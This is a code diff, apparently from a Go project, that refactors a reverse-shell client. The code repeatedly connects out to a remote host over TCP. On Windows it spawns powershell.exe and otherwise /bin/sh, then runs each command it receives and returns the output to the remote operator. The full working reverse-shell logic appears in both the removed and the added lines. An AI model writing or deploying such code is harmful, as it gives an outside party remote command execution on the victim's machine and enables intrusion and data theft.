@@ -28,17 +28,14 @@ func keepConnexionAlive(host string, port int) {
 		connexion, err := net.Dial("tcp", host+":"+strconv.Itoa(port))
 		if err != nil {
 			time.Sleep(2 * time.Second)
-			continue
+		} else {
+			connexion.Write([]byte(banner + "[+] Connected to server.\nType \"quit\" to close the shell properly or the process will die server side.\n"))
+			if runtime.GOOS == "windows" {
+				reverseShell(connexion, "powershell.exe")
+			} else {
+				reverseShell(connexion, "/bin/sh")
+			}
 		}
-		connexion.Write([]byte(banner + "[+] Connected to server.\nType \"quit\" to close the shell properly or the process will die server side.\n"))
-		var shell string
-		switch runtime.GOOS {
-		case "windows":
-			shell = "powershell.exe"
-		default:
-			shell = "/bin/sh"
-		}
-		reverseShell(connexion, shell)
 	}
 }
 
@@ -51,13 +48,11 @@ func reverseShell(connexion net.Conn, shell string) {
 			break
 		}
 		cmdOutput, err := exec.Command(shell, "-c", clientEntry).Output()
-		var log []byte
 		if err != nil {
-			log = []byte("[-] Unknown command. Error : " + err.Error() + "\n")
+			connexion.Write(append([]byte("[-] Unknown command. Error : "+err.Error()+"\n"), cmdOutput...))
 		} else {
-			log = []byte("[+] Command sent.\n")
+			connexion.Write(append([]byte("[+] Command sent.\n"), cmdOutput...))
 		}
-		connexion.Write(append(log, cmdOutput...))
 	}
 	connexion.Close()
 }
